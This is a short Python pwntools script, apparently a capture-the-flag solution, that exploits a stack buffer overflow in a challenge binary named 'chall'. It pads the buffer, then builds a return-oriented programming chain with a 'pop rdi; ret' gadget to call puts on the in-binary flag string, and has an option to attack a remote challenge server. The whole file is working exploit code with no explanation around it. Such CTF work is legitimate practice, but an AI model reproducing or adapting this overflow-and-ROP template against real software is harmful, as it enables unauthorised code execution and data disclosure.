#!/bin/env python3

from pwn import *
import sys

context.log_level = 'critical'
context.arch = 'amd64'
chall = ELF('./chall')

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    host, port = 'challs.xmas.htsp.ro', 12006
    p = remote(host, port)
else:
    p = chall.process()

buff = b'A' * (0xa + 8)
flag = p64(next(chall.search(b'X-MAS')))
call_puts = p64(chall.symbols['puts'])
pop_rdi = p64(next(chall.search(asm('pop rdi; ret'))))

ROP_chain = buff + pop_rdi + flag + call_puts

p.recvline()
p.sendline(ROP_chain)
p.recvline()
print(p.recvline().decode(), end='')
